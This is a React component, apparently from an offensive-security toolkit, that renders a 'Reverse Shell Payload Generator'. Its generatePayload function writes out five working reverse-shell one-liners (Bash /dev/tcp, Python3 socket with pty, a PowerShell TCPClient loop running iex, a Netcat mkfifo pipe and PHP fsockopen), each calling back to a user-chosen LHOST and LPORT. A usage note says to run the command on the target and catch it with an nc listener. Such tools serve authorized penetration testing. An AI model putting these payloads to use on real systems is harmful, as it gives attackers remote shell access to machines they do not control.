
'use client';

import { useState, useEffect } from 'react';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Loader2, Terminal, Sparkles, Clipboard, Info } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { Textarea } from '@/components/ui/textarea';
import { Label } from '@/components/ui/label';
import { getUserSettings } from '@/services/user-settings-service';

const formSchema = z.object({
  payloadType: z.string().min(1, { message: 'Please select a payload type.' }),
  lhost: z.string().min(1, 'LHOST is required.'),
  lport: z.string().min(1, 'LPORT is required.'),
});

const payloadTypes = [
  'Bash -i',
  'Python3',
  'PowerShell (TCP)',
  'Netcat (mkfifo)',
  'PHP (fsockopen)',
];

const generatePayload = (type: string, lhost: string, lport: string) => {
    switch(type) {
        case 'Bash -i':
            return `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
        case 'Python3':
            return `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`;
        case 'PowerShell (TCP)':
            return `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
        case 'Netcat (mkfifo)':
            return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
        case 'PHP (fsockopen)':
            return `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
        default:
            return 'Invalid payload type selected.';
    }
}


export function ReverseShellPayloadGenerator() {
  const [result, setResult] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      payloadType: 'Bash -i',
      lhost: '',
      lport: '',
    },
  });
  
  useEffect(() => {
    async function loadDefaults() {
      const settings = await getUserSettings();
      form.setValue('lhost', settings.offensive.defaultLhost);
      form.setValue('lport', settings.offensive.defaultLport);
    }
    loadDefaults();
  }, [form]);

  function onSubmit(values: z.infer<typeof formSchema>) {
    setIsLoading(true);
    setResult(null);
    const payload = generatePayload(values.payloadType, values.lhost, values.lport);
    setResult(payload);
    // Simulate a short delay to make it feel like something is happening
    setTimeout(() => setIsLoading(false), 300);
  }

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: 'Copied!',
      description: 'Payload copied to clipboard.',
    });
  };

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-3">
            <Terminal className="h-6 w-6" />
            <CardTitle>Reverse Shell Payload Generator</CardTitle>
        </div>
        <CardDescription>Generate common one-liner reverse shell payloads for various systems.</CardDescription>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <div className="grid md:grid-cols-3 gap-4">
               <FormField
                control={form.control}
                name="payloadType"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Payload Type</FormLabel>
                    <Select onValueChange={field.onChange} defaultValue={field.value}>
                      <FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl>
                      <SelectContent>
                        {payloadTypes.map((type) => (<SelectItem key={type} value={type}>{type}</SelectItem>))}
                      </SelectContent>
                    </Select>
                    <FormMessage />
                  </FormItem>
                )}
              />
               <FormField
                control={form.control}
                name="lhost"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>LHOST (Your IP)</FormLabel>
                    <FormControl><Input placeholder="e.g., 10.10.10.1" {...field} /></FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
               <FormField
                control={form.control}
                name="lport"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>LPORT (Your Port)</FormLabel>
                    <FormControl><Input placeholder="e.g., 4444" {...field} /></FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </div>
            
            <Button type="submit" disabled={isLoading} className="w-full md:w-auto">
              {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Sparkles className="mr-2 h-4 w-4" />}
              Generate Payload
            </Button>
          </form>
        </Form>
      </CardContent>
      
      {result && (
        <CardFooter className="flex-col items-start gap-4 border-t pt-6">
            <div>
              <Label>Generated Payload</Label>
              <div className="flex w-full items-center gap-2 mt-1">
                  <Textarea readOnly value={result} className="font-mono bg-primary/20" rows={4}/>
                  <Button type="button" size="icon" variant="outline" onClick={() => handleCopy(result)}>
                    <Clipboard className="h-4 w-4" />
                  </Button>
                </div>
            </div>
             <Card className="w-full bg-primary/20 border-accent/30">
                <CardHeader className="flex-row items-center gap-2 space-y-0 p-3">
                    <Info className="h-4 w-4 text-accent" />
                    <CardTitle className="text-base">Usage Notes</CardTitle>
                </CardHeader>
                <CardContent className="p-3 pt-0">
                    <p className="text-sm text-muted-foreground">Run this command on the target machine. Start a listener (e.g., `nc -lvnp {form.getValues('lport')}`) on your machine (LHOST) to catch the shell.</p>
                </CardContent>
            </Card>
        </CardFooter>
      )}
    </Card>
  );
}
